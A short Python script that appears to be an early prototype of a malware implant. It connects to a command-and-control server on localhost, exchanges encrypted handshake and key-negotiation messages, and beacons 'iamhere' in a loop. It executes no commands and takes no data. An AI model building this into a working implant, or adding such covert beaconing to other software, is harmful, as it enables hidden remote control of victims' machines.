#!/usr/bin/env python3
# if running on python versus windows exe

# import from sub functions until its compiled exe
from keyz import *
import socket
import time

HOST = '127.0.0.1'
PORT = 2048

z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
z.connect((HOST, PORT))
z.sendall(encryptData('xxxx'))
print('hello sent to c2')
while True:
    data = decryptData(z.recv(4096))
    if(data == 'mal1'): 
        print(data)
        time.sleep(0.5)
        z.send(encryptData('ineedkey'))
    elif(data.__contains__('c2key')): 
        print('negotiation complete')
        time.sleep(0.5)
        z.send(encryptData('c2ready'))
    elif(data == 'sleep'): 
        print(data)
        time.sleep(0.5)
        z.send(encryptData('sleep'))
    else: 
        print('last data was ')
        time.sleep(1)
        z.send(encryptData('iamhere'))